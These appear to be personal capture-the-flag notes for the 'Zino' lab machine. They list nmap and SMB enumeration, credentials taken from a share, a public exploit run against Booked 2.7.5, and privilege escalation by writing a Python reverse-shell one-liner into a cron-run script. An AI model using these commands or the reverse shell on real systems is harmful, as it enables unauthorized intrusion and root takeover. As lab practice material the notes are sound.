# Zino
# date 1/8/2023
# ip 192.168.219.64

# nmap 
sudo nmap 192.168.249.64 -p- -sV -sS

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql?
8003/tcp open  http        Apache httpd 2.4.38
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



# smb

smbmap -u '' -p '' -R -H 192.168.219.64

smbclient -U '' \\\\192.168.219.64\\zino 
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> prompt off
smb: \> mget *

investicate everything we got
target have user called peter
For an unknown verification we have the credentials admin: adminadmin.

# http://192.168.219.64:8003

I entered the credentials we found earlier of admin:adminadmin and was able to log in to the application.

└─$ searchsploit Booked  2.7.5 
searchsploit -m php/webapps/50594.py


# exploit 
└─$ python 50594.py http://192.168.219.64:8003 admin adminadmin
we got shell

# priv esc

cat /etc/crontab

$ ls -la python /var/www/html/booked/cleanup.py
-rwxrwxrwx 1 www-data www-data 164 Apr 28  2020 /var/www/html/booked/cleanup.py



└─$ nc -lvnp 21                               

echo ' ' > /var/www/html/booked/cleanup.py


echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.222",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /var/www/html/booked/cleanup.py

we got root
